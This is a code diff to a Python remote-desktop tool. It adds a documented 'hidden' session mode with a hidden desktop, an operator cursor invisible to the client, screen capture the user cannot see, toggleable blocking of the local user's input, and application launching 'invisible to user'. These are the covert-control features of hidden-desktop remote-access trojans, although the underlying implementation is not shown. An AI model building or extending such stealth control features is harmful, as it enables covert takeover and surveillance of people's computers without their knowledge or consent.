@@ -67,8 +67,27 @@ def _compose_close(
 
 
 def build_session_resources(mode: str | None) -> SessionResources:
+    """
+    Build session resources based on the requested mode.
+    
+    Modes:
+    - "view": Read-only viewing, no control
+    - "manage": Full control with visible cursor
+    - "hidden": Hidden desktop mode with:
+        - Invisible operator cursor (asynchronous from client cursor)
+        - Screen capture from hidden desktop only (user doesn't see operations)
+        - Toggleable local input blocking
+        - Stealth application launching
+    
+    Args:
+        mode: Session mode string
+        
+    Returns:
+        SessionResources configured for the mode
+    """
     normalized = _normalize_mode(mode)
     cursor_controller = CursorVisibilityController()
+    
     if normalized == "view":
         controller = NullInputController()
         screen_track = ScreenTrack()
@@ -94,6 +113,7 @@ def build_session_resources(mode: str | None) -> SessionResources:
             set_stream_profile=_set_stream_profile,
             set_cursor_visibility=cursor_controller.set_visible,
         )
+    
     if normalized == "hidden":
         try:
             hidden_session = HiddenDesktopSession()
@@ -113,14 +133,32 @@ def build_session_resources(mode: str | None) -> SessionResources:
                 fps: int | None,
             ) -> None:
                 hidden_session.screen_track.set_profile(profile, width, height, fps)
+            
+            def _launch_app_hidden(app_name: str) -> None:
+                """Launch application on hidden desktop (invisible to user)."""
+                hidden_session.launch_application(app_name)
+            
+            def _set_input_blocking(enabled: bool) -> bool:
+                """Toggle local input blocking (switchable module)."""
+                return hidden_session.set_input_blocking(enabled)
+            
+            def _get_input_blocked() -> bool:
+                """Check if local input is currently blocked."""
+                return hidden_session.is_input_blocked
 
             return SessionResources(
                 control_handler,
                 media_tracks,
                 close=hidden_session.close,
                 set_stream_profile=_set_stream_profile,
+                launch_app=_launch_app_hidden,
+                set_input_blocking=_set_input_blocking,
+                get_input_blocked=_get_input_blocked,
+                # Note: cursor visibility is not applicable in hidden mode
+                # as the operator cursor is always invisible to the client
             )
 
+    # Default "manage" mode
     controller = InputController()
     screen_track = ScreenTrack(draw_cursor=False)
     control_handler = _build_control_handler(controller)
